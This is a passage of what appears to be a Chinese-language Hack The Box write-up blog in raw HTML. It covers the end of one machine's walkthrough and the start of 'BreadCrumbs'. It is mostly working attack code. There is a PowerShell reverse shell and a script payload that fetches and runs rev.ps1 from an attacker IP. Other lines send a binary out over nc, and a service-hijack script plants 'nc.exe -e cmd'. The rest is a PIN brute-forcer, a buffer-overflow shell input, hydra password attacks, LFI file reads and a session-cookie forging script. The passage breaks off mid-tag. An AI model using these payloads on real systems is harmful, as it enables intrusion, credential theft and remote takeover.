class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$stream</span>.DataAvailable <span class="hljs-operator">-or</span> <span class="hljs-variable">$read</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$null</span>) &#123;<br><span class="hljs-variable">$read</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>)<br>&#125;<br><span class="hljs-variable">$out</span> = <span class="hljs-variable">$encoding</span>.GetString(<span class="hljs-variable">$buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$read</span>).Replace(<span class="hljs-string">&quot;`r`n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).Replace(<span class="hljs-string">&quot;`n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$out</span>.equals(<span class="hljs-string">&quot;exit&quot;</span>))&#123;<br><span class="hljs-variable">$args</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$out</span>.IndexOf(<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-operator">-gt</span> <span class="hljs-literal">-1</span>)&#123;<br><span class="hljs-variable">$args</span> = <span class="hljs-variable">$out</span>.substring(<span class="hljs-variable">$out</span>.IndexOf(<span class="hljs-string">&#x27; &#x27;</span>)+<span class="hljs-number">1</span>);<br><span class="hljs-variable">$out</span> = <span class="hljs-variable">$out</span>.substring(<span class="hljs-number">0</span>,<span class="hljs-variable">$out</span>.IndexOf(<span class="hljs-string">&#x27; &#x27;</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$args</span>.split(<span class="hljs-string">&#x27; &#x27;</span>).length <span class="hljs-operator">-gt</span> <span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-variable">$pinfo</span> = <span class="hljs-built_in">New-Object</span> System.Diagnostics.ProcessStartInfo<br>                <span class="hljs-variable">$pinfo</span>.FileName = <span class="hljs-string">&quot;cmd.exe&quot;</span><br>                <span class="hljs-variable">$pinfo</span>.RedirectStandardError = <span class="hljs-variable">$true</span><br>                <span class="hljs-variable">$pinfo</span>.RedirectStandardOutput = <span class="hljs-variable">$true</span><br>                <span class="hljs-variable">$pinfo</span>.UseShellExecute = <span class="hljs-variable">$false</span><br>                <span class="hljs-variable">$pinfo</span>.Arguments = <span class="hljs-string">&quot;/c <span class="hljs-variable">$out</span> <span class="hljs-variable">$args</span>&quot;</span><br>                <span class="hljs-variable">$p</span> = <span class="hljs-built_in">New-Object</span> System.Diagnostics.Process<br>                <span class="hljs-variable">$p</span>.StartInfo = <span class="hljs-variable">$pinfo</span><br>                <span class="hljs-variable">$p</span>.Start() | <span class="hljs-built_in">Out-Null</span><br>                <span class="hljs-variable">$p</span>.WaitForExit()<br>                <span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$p</span>.StandardOutput.ReadToEnd()<br>                <span class="hljs-variable">$stderr</span> = <span class="hljs-variable">$p</span>.StandardError.ReadToEnd()<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>.ExitCode <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$stderr</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$stdout</span><br>                &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$res</span> = (&amp;<span class="hljs-string">&quot;<span class="hljs-variable">$out</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$args</span>&quot;</span>) | <span class="hljs-built_in">out-string</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$res</span> = (&amp;<span class="hljs-string">&quot;<span class="hljs-variable">$out</span>&quot;</span>) | <span class="hljs-built_in">out-string</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$null</span>)&#123;<br>        <span class="hljs-variable">$writer</span>.WriteLine(<span class="hljs-variable">$res</span>)<br>    &#125;<br>&#125;<br>&#125;<span class="hljs-keyword">While</span> (!<span class="hljs-variable">$out</span>.equals(<span class="hljs-string">&quot;exit&quot;</span>))<br><span class="hljs-variable">$writer</span>.close();<br><span class="hljs-variable">$socket</span>.close();<br><span class="hljs-variable">$stream</span>.Dispose()<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">callSys</span>(<span class="hljs-string">&quot;dir | powershell IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.16.39/rev.ps1&#x27;)&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>即可反弹shell</p><h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><p>先看mysql数据库密码</p><p><img src="/../imgs/image-20250208002250625.png" alt="image-20250208002250625"></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">root<br>Welkom1!<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208002334166.png" alt="image-20250208002334166"></p><p>尝试下载下来分析</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\Cortin\AppData\Local\Temp\n.exe <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.39</span> <span class="hljs-number">1234</span> &lt; bankv2.exe<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208140409931.png" alt="image-20250208140409931"></p><p><img src="/../imgs/image-20250208140417058.png" alt="image-20250208140417058"></p><p><img src="/../imgs/image-20250208140439074.png" alt="image-20250208140439074"></p><p>都是拒绝访问</p><p><img src="/../imgs/image-20250208140706197.png" alt="image-20250208140706197"></p><p>利用收集到的密码喷洒下</p><p><img src="/../imgs/image-20250208141102460.png" alt="image-20250208141102460"></p><p>失败</p><p>批量劫持服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$services</span> = <span class="hljs-built_in">Get-Service</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-ExpandProperty</span> Name<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$service</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$services</span>) &#123; <br>  <span class="hljs-variable">$sddl</span> = (cmd /c <span class="hljs-built_in">sc</span> sdshow <span class="hljs-variable">$service</span>)[<span class="hljs-number">1</span>]; <br>  <span class="hljs-variable">$reg</span> = <span class="hljs-built_in">gp</span> <span class="hljs-literal">-path</span> hklm:\system\currentcontrolset\services\<span class="hljs-variable">$service</span>; <br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$sddl</span> <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;RP[A-Z]*?;;;AU&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$reg</span>.ObjectName <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;LocalSystem&quot;</span>) &#123; <br>    <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;Trying to hijack <span class="hljs-variable">$service</span>&quot;</span>; <br>    <span class="hljs-variable">$old_path</span> = (<span class="hljs-built_in">get-itemproperty</span> HKLM:\system\currentcontrolset\services\wuauserv).ImagePath; <br>    <span class="hljs-built_in">set-itemproperty</span> <span class="hljs-literal">-erroraction</span> silentlycontinue <span class="hljs-literal">-path</span> HKLM:\system\currentcontrolset\services\<span class="hljs-variable">$service</span> <span class="hljs-literal">-name</span> imagepath <span class="hljs-literal">-value</span> <span class="hljs-string">&quot;\programdata\nc.exe -e cmd 10.10.16.39 9003&quot;</span>; <br>    <span class="hljs-built_in">start-service</span> <span class="hljs-variable">$service</span> <span class="hljs-literal">-erroraction</span> silentlycontinue; <br>    <span class="hljs-built_in">set-itemproperty</span> <span class="hljs-literal">-path</span> HKLM:\system\currentcontrolset\services\<span class="hljs-variable">$service</span> <span class="hljs-literal">-name</span> imagepath <span class="hljs-literal">-value</span> <span class="hljs-variable">$old_path</span> <br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208141330571.png" alt="image-20250208141330571"></p><p><img src="/../imgs/image-20250208141316464.png" alt="image-20250208141316464"></p><p>失败</p><p>我们看看bankv2这个可执行文件是否正在系统中运行</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"> /c <span class="hljs-string">&quot;tasklist | findstr bank&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208142927525.png" alt="image-20250208142927525"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208142949987.png" alt="image-20250208142949987"></p><p>可以看到确实在运行</p><p><img src="/../imgs/image-20250208143012948.png" alt="image-20250208143012948"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c</span>:\programdata\nc.exe <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">910</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208143419331.png" alt="image-20250208143419331"></p><p>有点卡，转发出来</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta">kali:<br>./chisel <span class="hljs-keyword">server</span> -p <span class="hljs-number">9000</span> --<span class="hljs-keyword">reverse</span><br>windows:<br>.\ci.exe <span class="hljs-keyword">client</span> <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.39</span>:<span class="hljs-number">9000</span> R:<span class="hljs-number">8888</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">910</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208151150588.png" alt="image-20250208151150588"></p><p>我们写脚本破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 目标主机和端口</span><br>HOST=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>PORT=<span class="hljs-string">&quot;8888&quot;</span><br><br><span class="hljs-comment"># 从0000到9999依次测试</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始从 0000 测试到 9999...&quot;</span><br><br><span class="hljs-keyword">for</span> PIN <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> -w 0000 9999); <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;尝试 PIN: <span class="hljs-variable">$PIN</span>&quot;</span><br><br>    <span class="hljs-comment"># 发送 PIN 到目标服务器</span><br>    RESPONSE=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$PIN</span>&quot;</span> | nc <span class="hljs-string">&quot;<span class="hljs-variable">$HOST</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$PORT</span>&quot;</span> 2&gt;/dev/null)<br><br>    <span class="hljs-comment"># 检查服务器响应</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$RESPONSE</span>&quot;</span> | grep -q <span class="hljs-string">&quot;Access denied&quot;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PIN <span class="hljs-variable">$PIN</span> -&gt; Access denied&quot;</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PIN <span class="hljs-variable">$PIN</span> -&gt; 成功！响应内容: <span class="hljs-variable">$RESPONSE</span>&quot;</span><br>        <span class="hljs-built_in">exit</span> 0  <span class="hljs-comment"># 退出程序</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;所有 PIN 代码已尝试完，没有找到正确的 PIN。&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208165711994.png" alt="image-20250208165711994"></p><p>最终发现是0021</p><p>然后需要继续输入，这里需要用到溢出，举例,一开始输入</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">qwertyuiopasdfghjklzxcvbnm</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208165820341.png" alt="image-20250208165820341"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208165904094.png" alt="image-20250208165904094"></p><p>现在考虑溢出到我们的恶意代码,注意试了一次后就要恢复靶机</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qwertyuiopasdfghjklzxcvbnmqwerty</span>\programdata\nc.exe -e cmd <span class="hljs-number">10.10.16.39</span> <span class="hljs-number">9004</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250208173412720.png" alt="image-20250208173412720"></p><p><img src="/../imgs/image-20250208173401804.png" alt="image-20250208173401804"></p>]]></content>
    
    
    <categories>
      
      <category>HTB</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BreadCrumbs</title>
    <link href="/2025/01/22/HTB-BreadCrumbs/"/>
    <url>/2025/01/22/HTB-BreadCrumbs/</url>
    
    <content type="html"><![CDATA[<h2 id="BreadCrumbs"><a href="#BreadCrumbs" class="headerlink" title="BreadCrumbs"></a>BreadCrumbs</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">228</span><br><span class="hljs-attribute">sudo</span> masscan -p1-<span class="hljs-number">65535</span> <span class="hljs-number">10.10.10.228</span> --rate=<span class="hljs-number">1000</span> -e tun0 &gt; ports<br><span class="hljs-attribute">ports</span>=$(cat ports | awk -F <span class="hljs-string">&quot; &quot;</span> &#x27;&#123;print $<span class="hljs-number">4</span>&#125;&#x27; | awk -F <span class="hljs-string">&quot;/&quot;</span> &#x27;&#123;print $<span class="hljs-number">1</span>&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)<br><span class="hljs-attribute">nmap</span> -Pn -sV -sC -p$ports <span class="hljs-number">10.10.10.228</span><br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.10.228</span> --script=vuln<br><span class="hljs-attribute">nmap</span> <span class="hljs-number">10.10.10.228</span> -sU --top-ports <span class="hljs-number">20</span> -Pn<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250121140815112.png" alt="image-20250121140815112"></p><h3 id="smb-rpc服务初探"><a href="#smb-rpc服务初探" class="headerlink" title="smb&#x2F;rpc服务初探"></a>smb&#x2F;rpc服务初探</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">smblcinet</span> -L //<span class="hljs-number">10.10.10.228</span>/<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250121140855597.png" alt="image-20250121140855597"></p><h3 id="web服务探索"><a href="#web服务探索" class="headerlink" title="web服务探索"></a>web服务探索</h3><p><img src="/../imgs/image-20250121141213620.png" alt="image-20250121141213620"></p><p><img src="/../imgs/image-20250121141219657.png" alt="image-20250121141219657"></p><p><img src="/../imgs/image-20250121141240156.png" alt="image-20250121141240156"></p><p><img src="/../imgs/image-20250121141247519.png" alt="image-20250121141247519"></p><p>尝试爆破下</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Alex<br>Emma<br><span class="hljs-keyword">Jack</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">John</span><br><span class="hljs-keyword"></span>Lucas<br>Olivia<br>Paul<br></code></pre></td></tr></table></figure><p>还有种方法就是注册进去看User Mamager,用户更全</p><p><img src="/../imgs/image-20250121141518395.png" alt="image-20250121141518395"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">alex<br>paul<br><span class="hljs-keyword">jack</span><br><span class="hljs-keyword"></span>olivia<br><span class="hljs-keyword">john</span><br><span class="hljs-keyword"></span>emma<br>william<br>lucas<br>sirine<br><span class="hljs-keyword">juliette</span><br><span class="hljs-keyword"></span>support<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">hydra <span class="hljs-number">10.10</span>.<span class="hljs-number">10.228</span> http-post-form <span class="hljs-string">&quot;/portal/login.php:username=^USER^&amp;password=^PASS^&amp;method=0:Username or Password incorrect&quot;</span> -L <span class="hljs-keyword">user</span> <span class="hljs-title">-P</span> /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p>与此同时进行mysql的爆破</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">hydra <span class="hljs-number">10.10</span>.<span class="hljs-number">10.228</span> -L <span class="hljs-keyword">user</span> <span class="hljs-title">-P</span> /usr/share/wordlists/rockyou.txt mysql<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250121141938932.png" alt="image-20250121141938932"></p><p>不允许连接</p><p><img src="/../imgs/image-20250121142350269.png" alt="image-20250121142350269"></p><p>尝试sql注入</p><p><img src="/../imgs/image-20250121142709761.png" alt="image-20250121142709761"></p><p>这里可以看到书籍,然后当我搜索是书籍时，发现了如下</p><p><img src="/../imgs/image-20250121165743592.png" alt="image-20250121165743592"></p><p><img src="/../imgs/image-20250121165753829.png" alt="image-20250121165753829"></p><p>这也许意味着我可以read files</p><p><img src="/../imgs/image-20250121165827128.png" alt="image-20250121165827128"></p><p>成功！现在我们希望读取敏感文件了</p><p><img src="/../imgs/image-20250121170337990.png" alt="image-20250121170337990"></p><p><img src="/../imgs/image-20250121170345914.png" alt="image-20250121170345914"></p><p>读一下</p><p><img src="/../imgs/image-20250121170434531.png" alt="image-20250121170434531"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">3306</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;bread&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;jUli901&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;bread&quot;</span>;<br><br><span class="hljs-comment">// 创建数据库连接</span><br><span class="hljs-variable">$con</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>, <span class="hljs-variable">$port</span>);<br><br><span class="hljs-comment">// 检查连接是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$con</span>-&gt;connect_error) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect to the database server: &#x27;</span> . <span class="hljs-variable">$con</span>-&gt;connect_error);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>之前是不允许访问mysql，我们访问ssh看看</p><p><img src="/../imgs/image-20250121170620736.png" alt="image-20250121170620736"></p><p>失败</p><p><img src="/../imgs/image-20250121170715466.png" alt="image-20250121170715466"></p><p>失败，继续文件包含看看，看登录功能php</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">book=../portal/authController.php&amp;<span class="hljs-keyword">method</span>=1<br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250121171233097.png" alt="image-20250121171233097"></p><p>做了预处理不能注入<img src="/../imgs/image-20250121171259224.png" alt="image-20250121171259224"></p><p>但也许可以伪造jwt</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">6</span>cb<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>a<span class="hljs-number">2786</span>a<span class="hljs-number">483</span>ca<span class="hljs-number">5e44571</span>dcc<span class="hljs-number">5</span>f<span class="hljs-number">3</span>bfa<span class="hljs-number">298593</span>a<span class="hljs-number">6376</span>ad<span class="hljs-number">92185</span><span class="hljs-keyword">c</span><span class="hljs-number">3258</span>acd<span class="hljs-number">5591</span>e<br></code></pre></td></tr></table></figure><p>拿着原本的jwt去改造，改成alex</p><p><img src="/../imgs/image-20250121171933668.png" alt="image-20250121171933668"></p><p><img src="/../imgs/image-20250121171943334.png" alt="image-20250121171943334"></p><p>访问这个</p><p><img src="/../imgs/image-20250121171916984.png" alt="image-20250121171916984"></p><p>可以上传文件，我们包含下这个files.php看看内容</p><p><img src="/../imgs/image-20250121173453576.png" alt="image-20250121173453576"></p><p>好好好</p><p><img src="/../imgs/image-20250121174038916.png" alt="image-20250121174038916"></p><p>研究下cookie.php</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">book=../portal/cookie.php&amp;<span class="hljs-keyword">method</span>=1<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Generates a session cookie for the given username.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> string $username Username requesting session cookie</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> string $session_cookie Returns the generated cookie</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@devteam</span></span><br><span class="hljs-comment"> * Please DO NOT use default PHPSESSID; our security team says they are predictable.</span><br><span class="hljs-comment"> * CHANGE SECOND PART OF MD5 KEY EVERY WEEK</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makesession</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br>    <span class="hljs-variable">$max</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) - <span class="hljs-number">1</span>; <span class="hljs-comment">// 用户名长度-1</span><br>    <span class="hljs-variable">$seed</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$max</span>); <span class="hljs-comment">// 生成随机索引</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;s4lTy_stR1nG_&quot;</span> . <span class="hljs-variable">$username</span>[<span class="hljs-variable">$seed</span>] . <span class="hljs-string">&quot;(!528./9890&quot;</span>; <span class="hljs-comment">// 构建密钥</span><br><br>    <span class="hljs-variable">$session_cookie</span> = <span class="hljs-variable">$username</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$key</span>); <span class="hljs-comment">// 生成会话 cookie</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$session_cookie</span>; <span class="hljs-comment">// 返回生成的 cookie</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以伪造cookie</p><p><img src="/../imgs/image-20250121174837333.png" alt="image-20250121174837333"></p><p><img src="/../imgs/image-20250121174856059.png" alt="image-20250121174856059"></p><p>伪造paul,我们生成key进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>name = <span class="hljs-string">&quot;paul&quot;</span><br>listkey = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(name)):<br>    i = i<br>    key = <span class="hljs-string">&quot;s4lTy_stR1nG_&quot;</span> + name[i] + <span class="hljs-string">&quot;(!528./9890&quot;</span><br>    md5hash = hashlib.md5()<br>    md5hash.update(key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    listkey.append(name + md5hash.hexdigest())<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> listkey:<br>    <span class="hljs-built_in">print</span>(j)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">paula2a6a014d3bee04d7df8d5837d62e8c5</span><br><span class="hljs-string">paul61ff9d4aaefe6bdf45681678ba89ff9d</span><br><span class="hljs-string">paul8c8808867b53c49777fe5559164708c3</span><br><span class="hljs-string">paul47200b180ccd6835d25d034eeb6e6390</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/../imgs/image-20250122093705538.png" alt="image-20250122093705538"></p><p>第四个成功了</p><p><img src="/../imgs/image-20250122093746020.png" alt="image-20250122093746020"></p><p>尝试 上传文件</p><p><img src="/../imgs/image-20250122093921267.png" alt="image-20250122093921267"></p><p>伪造jwt</p><p><img src="/../imgs/image-20250122093936544.png" alt="image-20250122093936544"></p><p>伪造paul</p><p><img src="/../imgs/image-20250122100000394.png" alt="image-20250122100000394"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 